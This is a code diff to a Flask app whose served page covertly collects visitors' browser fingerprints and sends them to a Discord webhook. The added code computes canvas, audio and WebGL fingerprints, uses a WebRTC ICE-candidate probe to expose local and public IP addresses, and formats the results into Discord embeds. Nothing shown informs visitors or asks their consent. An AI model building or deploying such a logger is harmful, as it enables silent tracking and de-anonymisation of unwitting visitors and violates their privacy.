@@ -4,7 +4,7 @@ import time
 import threading
 from datetime import datetime, timezone
 import requests
-from flask import Flask, request, redirect, Response
+from flask import Flask, request, Response
 from dotenv import load_dotenv
 
 load_dotenv(os.path.join(os.path.dirname(__file__), ".env"))
@@ -27,6 +27,49 @@ def _send_to_discord(payload):
         requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=5)
     except requests.RequestException:
         pass  
+
+def format_webrtc(webrtc):
+    if not isinstance(webrtc, dict):
+        return "❌ WebRTC data unavailable"
+
+    if not webrtc.get("supported"):
+        return "❌ WebRTC not supported"
+
+    candidates = webrtc.get("candidates", [])
+
+    if not candidates:
+        return "⚠️ No ICE candidates exposed"
+
+    lines = []
+
+    for i, candidate in enumerate(candidates, 1):
+        candidate_type = candidate.get("type") or "unknown"
+        protocol = candidate.get("protocol") or "unknown"
+        address = candidate.get("address") or "hidden"
+        port = candidate.get("port") or "unknown"
+
+        if candidate_type == "host":
+            icon = "🏠"
+            description = "Local network candidate"
+        elif candidate_type == "srflx":
+            icon = "🌍"
+            description = "Public/NAT candidate"
+        elif candidate_type == "relay":
+            icon = "🔄"
+            description = "TURN relay candidate"
+        else:
+            icon = "❓"
+            description = "Unknown candidate"
+
+        lines.append(
+            f"{icon} **Candidate {i}**\n"
+            f"Type: `{candidate_type}` — {description}\n"
+            f"Address: `{address}`\n"
+            f"Protocol: `{protocol}`\n"
+            f"Port: `{port}`"
+        )
+
+    return "\n\n".join(lines)[:4000]
 
 def notify_discord(data):
     if not DISCORD_WEBHOOK_URL:
@@ -120,6 +163,31 @@ def notify_discord(data):
             "value": clean(data.get("user_agent")), 
             "inline": False, 
         }, 
+        {
+    "name": "Canvas Fingerprint",
+    "value": clean(data.get("canvasFingerprint")),
+    "inline": False,
+},
+{
+    "name": "Audio Fingerprint",
+    "value": clean(data.get("audioFingerprint")),
+    "inline": False,
+},
+{
+    "name": "WebGL Vendor",
+    "value": clean(data.get("webglVendor")),
+    "inline": True,
+},
+{
+    "name": "WebGL Renderer",
+    "value": clean(data.get("webglRenderer")),
+    "inline": True,
+},
+{
+    "name": "🌐 WebRTC Network",
+    "value": format_webrtc(data.get("webrtc")),
+    "inline": False,
+},
     ]
     payload = { 
         "embeds": [ 
@@ -276,75 +344,111 @@ BROWSER_PAGE = """ <!DOCTYPE html>
 
     const data = {
 
-        // Browser / language
-        language: safe(navigator.language),
-        languages: safe(navigator.languages),
+    language: safe(navigator.language),
+    languages: safe(navigator.languages),
 
-        // Platform
-        platform: safe(navigator.platform),
-        userAgent: safe(navigator.userAgent),
+    platform: safe(navigator.platform),
+    userAgent: safe(navigator.userAgent),
 
-        // Browser capabilities
-        cookieEnabled: safe(navigator.cookieEnabled),
-        doNotTrack: safe(navigator.doNotTrack),
-        online: safe(navigator.onLine),
+    cookieEnabled: safe(navigator.cookieEnabled),
+    doNotTrack: safe(navigator.doNotTrack),
+    online: safe(navigator.onLine),
 
-        // Hardware information exposed by browser
-        hardwareConcurrency: safe(navigator.hardwareConcurrency),
-        deviceMemory: safe(navigator.deviceMemory),
-        maxTouchPoints: safe(navigator.maxTouchPoints),
+    hardwareConcurrency:
+        safe(navigator.hardwareConcurrency),
 
-        // Screen
-        screen: safe(`${screen.width}x${screen.height}`),
-        screenWidth: safe(screen.width),
-        screenHeight: safe(screen.height),
-        availableWidth: safe(screen.availWidth),
-        availableHeight: safe(screen.availHeight),
-        colorDepth: safe(screen.colorDepth),
-        pixelDepth: safe(screen.pixelDepth),
+    deviceMemory:
+        safe(navigator.deviceMemory),
 
-        // Window
-        viewportWidth: safe(window.innerWidth),
-        viewportHeight: safe(window.innerHeight),
-        devicePixelRatio: safe(window.devicePixelRatio),
+    maxTouchPoints:
+        safe(navigator.maxTouchPoints),
 
-        // Time
-        timezone: safe(
-            Intl.DateTimeFormat().resolvedOptions().timeZone
-        ),
-        timezoneOffset: safe(
-            new Date().getTimezoneOffset()
-        ),
+    screen:
+        safe(`${screen.width}x${screen.height}`),
 
-        // Display preferences
-        darkMode: safe(
-            window.matchMedia("(prefers-color-scheme: dark)").matches
-        ),
-        lightMode: safe(
-            window.matchMedia("(prefers-color-scheme: light)").matches
-        ),
-        reducedMotion: safe(
-            window.matchMedia("(prefers-reduced-motion: reduce)").matches
-        ),
+    screenWidth:
+        safe(screen.width),
 
-        // Touch
-        touchSupported: safe(
-            "ontouchstart" in window
-        ),
+    screenHeight:
+        safe(screen.height),
 
-        // Current page
-        page: safe(
-            window.location.href
+    availableWidth:
+        safe(screen.availWidth),
+
+    availableHeight:
+        safe(screen.availHeight),
+
+    colorDepth:
+        safe(screen.colorDepth),
+
+    pixelDepth:
+        safe(screen.pixelDepth),
+
+    viewportWidth:
+        safe(window.innerWidth),
+
+    viewportHeight:
+        safe(window.innerHeight),
+
+    devicePixelRatio:
+        safe(window.devicePixelRatio),
+
+    timezone:
+        safe(
+            Intl.DateTimeFormat()
+                .resolvedOptions()
+                .timeZone
         ),
 
-        // Referrer
-        referrer: safe(
-            document.referrer
+    timezoneOffset:
+        safe(new Date().getTimezoneOffset()),
+
+    darkMode:
+        safe(
+            window.matchMedia(
+                "(prefers-color-scheme: dark)"
+            ).matches
         ),
 
-        // Timestamp
-        clientTime: new Date().toISOString()
-    };
+    lightMode:
+        safe(
+            window.matchMedia(
+                "(prefers-color-scheme: light)"
+            ).matches
+        ),
+
+    reducedMotion:
+        safe(
+            window.matchMedia(
+                "(prefers-reduced-motion: reduce)"
+            ).matches
+        ),
+
+    touchSupported:
+        safe("ontouchstart" in window),
+
+    page:
+        safe(window.location.href),
+
+    referrer:
+        safe(document.referrer),
+
+    clientTime:
+        new Date().toISOString(),
+
+    // Fingerprint signals
+    canvasFingerprint:
+        await getCanvasFingerprint(),
+
+    webgl:
+        safe(getWebGLFingerprint()),
+
+    audioFingerprint:
+        await getAudioFingerprint(),
+    
+    webrtc:
+        await getWebRTCDiagnostics()
+};
 
     try {
 
@@ -373,6 +477,248 @@ BROWSER_PAGE = """ <!DOCTYPE html>
     }
 
 })();
+async function getWebRTCDiagnostics() {
+    try {
+        if (!window.RTCPeerConnection) {
+            return {
+                supported: false,
+                candidates: []
+            };
+        }
+
+        const pc = new RTCPeerConnection({
+            iceServers: []
+        });
+
+        const candidates = [];
+
+        pc.onicecandidate = (event) => {
+            if (!event.candidate) return;
+
+            const candidate = event.candidate;
+
+            candidates.push({
+                type: candidate.type || null,
+                protocol: candidate.protocol || null,
+                address: candidate.address || null,
+                port: candidate.port || null
+            });
+        };
+
+        pc.createDataChannel("diagnostic");
+
+        const offer = await pc.createOffer();
+        await pc.setLocalDescription(offer);
+
+        await new Promise(resolve => setTimeout(resolve, 1000));
+
+        pc.close();
+
+        return {
+            supported: true,
+            candidates: candidates
+        };
+
+    } catch (error) {
+        return {
+            supported: false,
+            error: String(error)
+        };
+    }
+}
+async function getCanvasFingerprint() {
+        try {
+            const canvas = document.createElement("canvas");
+            canvas.width = 280;
+            canvas.height = 80;
+
+            const ctx = canvas.getContext("2d");
+            if (!ctx) return null;
+
+            ctx.textBaseline = "top";
+            ctx.font = "16px Arial";
+            ctx.fillStyle = "#f60";
+            ctx.fillRect(10, 10, 100, 30);
+
+            ctx.fillStyle = "#069";
+            ctx.fillText(
+                "Browser fingerprint",
+                15,
+                20
+            );
+
+            ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+            ctx.fillText(
+                "canvas-test",
+                20,
+                45
+            );
+
+            return await sha256(canvas.toDataURL());
+        } catch {
+            return null;
+        }
+    }
+
+
+    function getWebGLFingerprint() {
+        try {
+            const canvas = document.createElement("canvas");
+
+            const gl =
+                canvas.getContext("webgl") ||
+                canvas.getContext("experimental-webgl");
+
+            if (!gl) {
+                return {
+                    supported: false
+                };
+            }
+
+            const debugInfo =
+                gl.getExtension("WEBGL_debug_renderer_info");
+
+            let vendor = null;
+            let renderer = null;
+
+            if (debugInfo) {
+                vendor = gl.getParameter(
+                    debugInfo.UNMASKED_VENDOR_WEBGL
+                );
+
+                renderer = gl.getParameter(
+                    debugInfo.UNMASKED_RENDERER_WEBGL
+                );
+            }
+
+            return {
+                supported: true,
+                vendor: vendor,
+                renderer: renderer,
+                version: gl.getParameter(gl.VERSION),
+                shadingLanguageVersion:
+                    gl.getParameter(
+                        gl.SHADING_LANGUAGE_VERSION
+                    ),
+                maxTextureSize:
+                    gl.getParameter(
+                        gl.MAX_TEXTURE_SIZE
+                    ),
+                maxViewportDims:
+                    Array.from(
+                        gl.getParameter(
+                            gl.MAX_VIEWPORT_DIMS
+                        )
+                    )
+            };
+
+        } catch {
+            return {
+                supported: false
+            };
+        }
+    }
+
+
+    async function getAudioFingerprint() {
+        try {
+            const AudioContext =
+                window.OfflineAudioContext ||
+                window.webkitOfflineAudioContext;
+
+            if (!AudioContext) {
+                return null;
+            }
+
+            const context = new AudioContext(
+                1,
+                44100,
+                44100
+            );
+
+            const oscillator =
+                context.createOscillator();
+
+            const compressor =
+                context.createDynamicsCompressor();
+
+            oscillator.type = "triangle";
+            oscillator.frequency.value = 10000;
+
+            compressor.threshold.value = -50;
+            compressor.knee.value = 40;
+            compressor.ratio.value = 12;
+            compressor.attack.value = 0;
+            compressor.release.value = 0.25;
+
+            oscillator.connect(compressor);
+            compressor.connect(context.destination);
+
+            oscillator.start(0);
+
+            const buffer =
+                await context.startRendering();
+
+            const channel =
+                buffer.getChannelData(0);
+
+            // Only summarize the result instead of
+            // sending the entire audio buffer.
+            let sum = 0;
+            let weighted = 0;
+
+            const step = Math.max(
+                1,
+                Math.floor(channel.length / 1000)
+            );
+
+            for (
+                let i = 0;
+                i < channel.length;
+                i += step
+            ) {
+                const value = channel[i];
+
+                sum += Math.abs(value);
+                weighted += value * (i + 1);
+            }
+
+            return await sha256(
+                `${sum}|${weighted}|${channel.length}`
+            );
+
+        } catch {
+            return null;
+        }
+    }
+
+
+    async function sha256(value) {
+        try {
+            const data =
+                new TextEncoder().encode(value);
+
+            const hash =
+                await crypto.subtle.digest(
+                    "SHA-256",
+                    data
+                );
+
+            return Array.from(
+                new Uint8Array(hash)
+            )
+                .map(
+                    byte =>
+                        byte
+                            .toString(16)
+                            .padStart(2, "0")
+                )
+                .join("");
+
+        } catch {
+            return null;
+        }
+    }
 </script>
 
 </body>
@@ -463,6 +809,18 @@ def collect():
         browser_data["device"] = detect_device(
             user_agent
         )
+
+        # WebGL data for Discord
+        webgl = browser_data.get("webgl")
+
+        if isinstance(webgl, dict):
+            browser_data["webglVendor"] = webgl.get(
+                "vendor"
+            )
+
+            browser_data["webglRenderer"] = webgl.get(
+                "renderer"
+            )
 
         browser_data["server_timestamp"] = (
             datetime.now(
